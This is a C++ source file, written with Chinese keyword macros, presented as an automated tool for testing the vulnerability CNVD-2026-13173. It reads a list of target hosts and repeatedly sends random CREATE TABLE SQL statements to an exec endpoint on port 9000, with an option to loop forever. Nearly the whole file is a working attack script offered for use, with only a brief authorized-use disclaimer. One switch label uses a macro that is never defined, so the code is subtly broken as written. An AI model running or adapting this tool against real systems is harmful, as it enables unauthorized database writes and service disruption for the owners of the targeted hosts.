#define 结构 struct
#define 类 class
#define 函数 void
#define 整数 int
#define 布尔 bool
#define 字符串 std::string
#define 向量 std::vector
#define 常量 const
#define 静态 static
#define 空 nullptr

#define 开始 {
#define 结束 }
#define 如果 if
#define 否则 else
#define 当 while
#define 对于 for
#define 开关 switch
#define 案例 case
#define 跳出 break
#define 继续 continue
#define 返回 return

#define 公开 public
#define 私有 private
#define 保护 protected

#define 输出 std::cout
#define 输入 std::cin

#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <getopt.h>
#include <ctime>
#include <curl/curl.h>

/**
 * @file inject.cc
 * @brief CNVD-2026-13173 漏洞注入工具 - 针对特定数据库漏洞的自动化测试工具
 * 
 * 本工具设计用于自动化测试CNVD-2026-13173漏洞，通过向目标主机发送特制的SQL查询请求，
 * 验证目标系统是否存在相应的安全漏洞。工具支持多主机批量测试、循环执行、无限循环模式等功能，
 * 并集成了libcurl库进行HTTP请求处理，采用中文语义化宏定义提升代码可读性。
 * 
 * 主要功能特性：
 * 1. 支持从文件读取目标主机列表，每行一个主机地址
 * 2. 支持有限次数循环和无限循环两种执行模式
 * 3. 自动生成随机的SQL表名和列定义进行注入测试
 * 4. 实时显示注入进度和HTTP响应状态
 * 5. 基于libcurl实现稳定的HTTP通信，支持超时设置
 * 6. 使用中文语义化宏定义，增强代码可读性和维护性
 * 
 * 代码特点：
 * - 使用中文宏定义重构C/C++关键字，如：结构(struct)、整数(int)、字符串(std::string)等
 * - 采用面向过程与结构化编程结合的设计模式
 * - 包含完善的错误处理和资源管理机制
 * - 支持标准命令行参数解析，符合POSIX规范
 * 
 * @author 钟智强 <ctkqiang@dingtalk.com>
 * @version 1.0.0
 * @date 2026-03-13
 * 
 * @section 编译说明
 * 
 * 编译环境要求：
 * - GCC/G++ 编译器（支持C++11标准）
 * - libcurl 开发库
 * - POSIX 兼容系统（Linux, macOS等）
 * 
 * 编译命令：
 * @code
 * g++ -o inject inject.cc -lcurl -std=c++11 -O2 -Wall -Wextra
 * @endcode
 * 
 * 编译选项说明：
 * - -o inject: 指定输出可执行文件名为inject
 * - -lcurl: 链接libcurl库
 * - -std=c++11: 使用C++11标准
 * - -O2: 优化级别2，平衡性能与代码大小
 * - -Wall -Wextra: 开启额外警告信息，提升代码质量
 * 
 * @section 使用方法
 * 
 * 基本语法：
 * @code
 * ./inject -f <主机文件> -l <循环次数|inf>
 * @endcode
 * 
 * 参数详解：
 * 1. -f, --file <主机文件>: 指定包含目标主机列表的文件路径
 *    - 文件格式：每行一个主机地址，支持IP、域名或完整URL
 *    - 支持注释：以#开头的行将被忽略
 *    - 示例文件内容：
 *          # 测试目标列表
 *          192.168.1.100
 *          localhost
 *          http://example.com:9000
 * 
 * 2. -l, --loop <循环次数|inf>: 指定循环执行次数
 *    - 正整数: 执行指定次数后自动停止
 *    - inf 或 0: 无限循环模式，需手动停止（Ctrl+C）
 *    - 默认值: 1次（如果不指定-l参数）
 * 
 * @section 使用示例
 * 
 * 示例1：对单主机执行1次测试
 * @code
 * ./inject -f hosts.txt -l 1
 * @endcode
 * 
 * 示例2：对多主机执行5次循环测试
 * @code
 * ./inject -f target_hosts.txt -l 5
 * @endcode
 * 
 * 示例3：无限循环测试模式（用于持续监控）
 * @code
 * ./inject -f hosts.txt -l inf
 * @endcode
 * 
 * 示例4：使用默认localhost目标进行测试
 * @code
 * ./inject -l 3
 * @endcode
 * 
 * @section 输出说明
 * 
 * 程序运行时将显示以下信息：
 * 1. 目标主机列表
 * 2. 循环模式配置
 * 3. 每次注入的详细信息：[时间] 正在注入表: <表名> @ <主机> | 状态码: <HTTP状态>
 * 4. 循环进度指示
 * 
 * @section 注意事项
 * 
 * 1. 合法使用：本工具仅用于授权安全测试，禁止用于非法攻击
 * 2. 权限要求：确保对目标主机有明确的测试授权
 * 3. 网络连接：确保网络连通性，防火墙可能影响测试结果
 * 4. 资源占用：无限循环模式会持续占用系统资源，请谨慎使用
 * 5. 结果解读：HTTP状态码200表示请求成功，其他状态码需进一步分析
 * 6. 错误处理：遇到错误时会显示详细错误信息，请根据提示排查
 * 
 * @section 依赖说明
 * 
 * 运行时依赖：
 * - libcurl: HTTP客户端库
 * - POSIX兼容系统环境
 * 
 * 开发依赖：
 * - GCC/G++编译器
 * - libcurl开发头文件
 * 
 * @section 更新日志
 * 
 * v1.0.0 (2026-03-13)
 * - 初始版本发布
 * - 实现基本注入功能
 * - 添加中文语义化宏定义
 * - 完善命令行参数解析
 * - 集成libcurl进行HTTP通信
 * 
 * @section 许可证
 * 
 * 本工具遵循MIT开源许可证，详情请参阅项目LICENSE文件。
 * 
 * @section 联系方式
 * 
 * 作者：钟智强
 * 邮箱：ctkqiang@dingtalk.com
 * 问题反馈：请通过GitHub Issues提交问题报告
 */

结构 选项结构体 开始
    字符串 主机文件路径;
    整数 循环次数 = 1;
    布尔 无限循环标志 = false;
结束;


选项结构体 解析命令行参数(整数 参数数量, char** 参数数组) 开始
    选项结构体 选项;
    整数 c;
    结构 option 长选项数组[] = 开始
        {"file",   required_argument, 空, 'f'},
        {"loop",   required_argument, 空, 'l'},
        {"l",      required_argument, 空, 'l'},
        {空, 0, 空, 0}
    结束;

    当 ((c = getopt_long(参数数量, 参数数组, "f:l:", 长选项数组, 空)) != -1) 开始
        开关 (c) 开始
            案例 'f':
                选项.主机文件路径 = optarg;
                跳出;
            案例 'l':
                如果 (strcmp(optarg, "inf") == 0 || strcmp(optarg, "0") == 0) 开始
                    选项.无限循环标志 = true;
                    选项.循环次数 = -1;
                结束 否则 开始
                    选项.循环次数 = std::atoi(optarg);
                    如果 (选项.循环次数 <= 0) 开始
                        std::cerr << "错误：循环次数必须为正整数或 inf\n";
                        exit(1);
                    结束
                结束
                跳出;
            默认:
                std::cerr << "用法: " << 参数数组[0] << " -f <主机文件> -l <次数|inf>\n";
                exit(1);
        结束
    结束
    返回 选项;
结束

// 从文件读取主机列表（忽略空行和 # 注释）
向量<字符串> 从文件读取主机列表(常量 字符串& 文件名) 开始
    向量<字符串> 主机列表;
    std::ifstream 文件(文件名);
    如果 (!文件.is_open()) 开始
        std::perror("fopen");
        返回 主机列表;
    结束

    字符串 行;
    当 (std::getline(文件, 行)) 开始
        // 去除行首尾空白
        size_t 开始位置 = 行.find_first_not_of(" \t");
        如果 (开始位置 == 字符串::npos) 继续;  // 空行
        size_t 结束位置 = 行.find_last_not_of(" \t");
        字符串 修剪后 = 行.substr(开始位置, 结束位置 - 开始位置 + 1);

        // 跳过注释行（# 开头）
        如果 (修剪后.empty() || 修剪后[0] == '#') 继续;

        主机列表.push_back(修剪后);
    结束
    返回 主机列表;
结束

// 生成随机小写字母字符串
字符串 随机字符串(size_t 长度) 开始
    静态 常量 char 字符集[] = "abcdefghijklmnopqrstuvwxyz";
    静态 布尔 已初始化随机种子 = false;
    如果 (!已初始化随机种子) 开始
        std::srand(std::time(空) ^ getpid());
        已初始化随机种子 = true;
    结束
    字符串 结果;
    对于 (size_t i = 0; i < 长度; ++i) 开始
        结果 += 字符集[std::rand() % (sizeof(字符集) - 1)];
    结束
    返回 结果;
结束

// libcurl 写入回调（忽略响应体）
size_t 写入回调函数(void* 内容, size_t 大小, size_t 元素数量, void* 用户指针) 开始
    返回 大小 * 元素数量;
结束

// 对单个主机执行注入
函数 执行表注入(常量 字符串& 主机地址, 整数 端口号) 开始
    // 随机表名 (5-10 字母)
    整数 表名长度 = 5 + std::rand() % 6;
    字符串 表名 = 随机字符串(表名长度);

    // 随机列 (2-10 列)
    整数 列数量 = 2 + std::rand() % 9;
    字符串 列定义;
    对于 (整数 i = 0; i < 列数量; ++i) 开始
        如果 (i > 0) 列定义 += ", ";
        列定义 += 随机字符串(5) + " INT";
    结束

    // 构造 SQL
    字符串 查询语句 = "CREATE TABLE " + 表名 + " (" + 列定义 + ");";

    // 构造 URL
    字符串 url;
    如果 (主机地址.find("http://") == 0 || 主机地址.find("https://") == 0) 开始
        url = 主机地址 + "/exec";
    结束 否则 开始
        url = "http://" + 主机地址 + ":" + std::to_string(端口号) + "/exec";
    结束

    CURL* curl指针 = curl_easy_init();
    如果 (!curl指针) 开始
        std::cerr << "curl_easy_init 失败\n";
        返回;
    结束

    // URL 编码查询参数
    char* 编码后的查询 = curl_easy_escape(curl指针, 查询语句.c_str(), 0);
    字符串 完整URL = url + "?query=" + 编码后的查询;
    curl_easy_setopt(curl指针, CURLOPT_URL, 完整URL.c_str());
    curl_easy_setopt(curl指针, CURLOPT_HTTPGET, 1L);
    curl_easy_setopt(curl指针, CURLOPT_WRITEFUNCTION, 写入回调函数);
    curl_easy_setopt(curl指针, CURLOPT_TIMEOUT, 10L);

    CURLcode 执行结果 = curl_easy_perform(curl指针);
    long HTTP状态码 = 0;
    如果 (执行结果 == CURLE_OK) 开始
        curl_easy_getinfo(curl指针, CURLINFO_RESPONSE_CODE, &HTTP状态码);
    结束 否则 开始
        HTTP状态码 = -1;
    结束
    curl_easy_cleanup(curl指针);
    curl_free(编码后的查询);

    // 输出时间戳
    time_t 当前时间 = std::time(空);
    结构 tm* 时间信息 = std::localtime(&当前时间);
    char 时间缓冲区[32];
    std::strftime(时间缓冲区, sizeof(时间缓冲区), "%H:%M:%S", 时间信息);

    输出 << "[" << 时间缓冲区 << "] 正在注入表: " << 表名
         << " @ " << 主机地址 << " | 状态码: " << HTTP状态码 << std::endl;
结束

整数 main(整数 参数数量, char** 参数数组) 开始
    选项结构体 选项 = 解析命令行参数(参数数量, 参数数组);

    // 获取主机列表
    向量<字符串> 主机列表;
    如果 (!选项.主机文件路径.empty()) 开始
        主机列表 = 从文件读取主机列表(选项.主机文件路径);
        如果 (主机列表.empty()) 开始
            std::cerr << "错误：无法从文件 " << 选项.主机文件路径 << " 读取有效主机\n";
            返回 1;
        结束
    结束 否则 开始
        // 默认 localhost
        主机列表.push_back("localhost");
    结束

    输出 << "[*] 目标主机列表:\n";
    对于 (常量 auto& h : 主机列表) 开始
        输出 << "    " << h << std::endl;
    结束
    如果 (选项.无限循环标志) 开始
        输出 << "[*] 循环模式: 无限循环 (按 Ctrl+C 停止)\n";
    结束 否则 开始
        输出 << "[*] 循环模式: " << 选项.循环次数 << " 次\n";
    结束
    输出 << "[*] 目标端口: " << 9000<< "\n\n";

    curl_global_init(CURL_GLOBAL_ALL);

    整数 全局循环计数器 = 1;
    当 (true) 开始
        对于 (常量 auto& 主机 : 主机列表) 开始
            如果 (!选项.无限循环标志) 开始
                输出 << "--- 循环 " << 全局循环计数器 << "/" << 选项.循环次数
                     << " - 目标主机: " << 主机 << " ---\n";
            结束 否则 开始
                输出 << "--- 全局循环 #" << 全局循环计数器 << " - 目标主机: " << 主机 << " ---\n";
            结束
            执行表注入(主机, 9000);
        结束
        全局循环计数器++;

        如果 (!选项.无限循环标志) 开始
            如果 (全局循环计数器 > 选项.循环次数) 跳出;
        结束 否则 开始
            usleep(500000);  // 0.5 秒
        结束
    结束

    curl_global_cleanup();
    返回 0;
结束